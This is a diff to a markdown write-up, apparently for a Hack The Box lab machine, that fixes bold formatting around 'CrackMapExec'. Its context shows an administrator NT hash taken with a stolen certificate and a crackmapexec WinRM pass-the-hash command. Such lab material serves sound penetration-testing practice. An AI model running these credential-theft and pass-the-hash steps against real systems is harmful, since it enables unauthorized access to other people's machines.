@@ -302,7 +302,7 @@ So now we can authenticate using the **stolen certificate** 😊.
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83aXXXXXXXXXXXXXXXXXXXXXXXXXX
 ```
-To confirm the validity of the obtained **NT hash,** we will now use ** CrackMapExec** for verification.
+To confirm the validity of the obtained **NT hash,** we will now use **CrackMapExec** for verification.
 
 ```bash
 ζ crackmapexec winrm fluffy.htb -u administrator -H 8da83aXXXXXXXXXXXXXXXXXX
